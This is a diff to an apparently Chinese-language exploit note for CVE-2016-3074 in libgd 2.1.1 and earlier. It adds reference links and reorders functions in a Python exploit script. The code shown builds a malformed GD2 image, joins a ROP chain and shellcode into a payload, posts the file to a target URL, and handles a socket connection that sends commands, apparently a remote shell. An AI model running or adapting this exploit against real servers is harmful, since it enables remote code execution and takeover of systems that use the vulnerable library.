@@ -1,4 +1,8 @@
-（GD Graphics Library 2.1.1 (aka libgd or libgd2)）
+参考：
+- https://github.com/dyntopia/exploits/tree/master/CVE-2016-3074
+- https://github.com/libgd/libgd/commit/2bb97f407c1145c850416a3bfbcc8cf124e68a19
+
+（GD Graphics Library <= 2.1.1 (aka libgd or libgd2)）
 
 exp:
 ```python
@@ -193,7 +197,6 @@ gadgets = [
 # gd.h: #define gdMaxColors 256
 gd_max_colors = 256
 
-
 def make_gd2(chunks):
     gd2 = [
         "gd2\x00",                    # signature
@@ -219,7 +222,6 @@ def make_gd2(chunks):
         offset += size
 
     return "".join(gd2 + colors + [data for data, size in chunks])
-
 
 def connect(host, port):
     addr = socket.gethostbyname(host)
@@ -248,16 +250,6 @@ def connect(host, port):
                 sys.exit("[!] sender aborting")
             sock.send(cmd)
 
-
-def send_gd2(url, gd2, code):
-    files = {"file": gd2}
-    try:
-        req = requests.post(url, files=files, timeout=5)
-        code.append(req.status_code)
-    except requests.exceptions.ReadTimeout:
-        pass
-
-
 def get_payload(offset, port):
     rop = "".join(gadgets) % {"pad": "\x90" * offset}
 
@@ -265,7 +257,6 @@ def get_payload(offset, port):
     sc = "".join(shellcode) % {"fam-and-port": fam_and_port}
 
     return rop + sc
-
 
 def get_args():
     p = argparse.ArgumentParser()
@@ -275,6 +266,13 @@ def get_args():
     p.add_argument("url")
     return p.parse_args()
 
+def send_gd2(url, gd2, code):
+    files = {"file": gd2}
+    try:
+        req = requests.post(url, files=files, timeout=5)
+        code.append(req.status_code)
+    except requests.exceptions.ReadTimeout:
+        pass
 
 def main():
     args = get_args()
